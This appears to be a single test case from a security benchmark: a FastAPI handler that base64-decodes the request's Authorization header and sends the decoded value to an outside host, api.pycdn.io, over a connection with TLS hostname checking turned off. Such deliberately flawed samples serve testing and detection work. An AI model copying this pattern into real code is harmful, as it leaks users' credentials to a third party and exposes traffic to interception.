# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import base64
import urllib.request
import urllib.parse
import ssl


async def BenchmarkTest39068(request: Request):
    auth_header = request.headers.get('authorization', '')
    data = base64.b64decode(auth_header).decode('utf-8', 'ignore')
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return {"updated": True}
